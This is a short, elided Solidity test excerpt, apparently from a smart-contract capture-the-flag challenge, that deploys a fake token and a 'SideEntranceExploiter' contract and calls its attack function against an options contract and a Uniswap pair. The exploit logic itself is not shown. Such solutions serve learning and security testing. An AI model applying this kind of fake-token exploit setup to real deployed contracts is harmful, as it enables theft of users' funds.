...
import {SideEntranceExploiter} from "src/exploiter_contracts/side-entrance_exploiter.sol";
...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        Token falseToken = new Token('False','F');
        SideEntranceExploiter exploiter =
        new SideEntranceExploiter(address(uniFactory), address(uniRouter), address(usdcDaiPair), address(optionsContract), address(usdc), address(falseToken));
        falseToken.mint(address(exploiter), 5_000e18);

        bytes32 id = optionsContract.getLatestOptionId();

        exploiter.attack(id, 5_000e18);
